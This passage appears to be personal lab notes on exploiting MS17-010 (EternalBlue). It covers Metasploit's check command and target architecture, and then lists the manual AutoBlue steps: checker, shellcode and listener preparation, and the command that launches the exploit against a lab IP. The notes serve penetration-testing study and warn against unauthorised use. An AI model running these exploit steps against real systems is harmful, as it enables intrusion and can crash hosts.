- We can use `check` command after selecting the exploit, to verify if it is exploitable:
![[Pasted image 20250325040656.png]]
- Sometimes, by default, metasploit select `x64` as default architecture, ==make sure to check and change it for different architectures.==
![[Pasted image 20250325040811.png]]

# Manual Exploitation with [3endG4me AutoBlue](https://github.com/3ndG4me/AutoBlue-MS17-010)
---
- Checking with `./eternal_checker.py 192.168.157.129` 
![[Pasted image 20250325041244.png]]
- `cd shellcode`
- `./shell_prep.sh`
![[Pasted image 20250325041649.png]]
- `./listener_prep.sh`
- ` python3 eternalblue_exploit7.py 192.168.157.129 shellcode/sc_all.bin ` => To run the exploit
![[Pasted image 20250325042104.png]]
- Lesson To Learn: **NEVER RUN WITHOUT PERMISSION, AS IT CAN CAUSE CRASHES**
![[Pasted image 20250325042301.png]]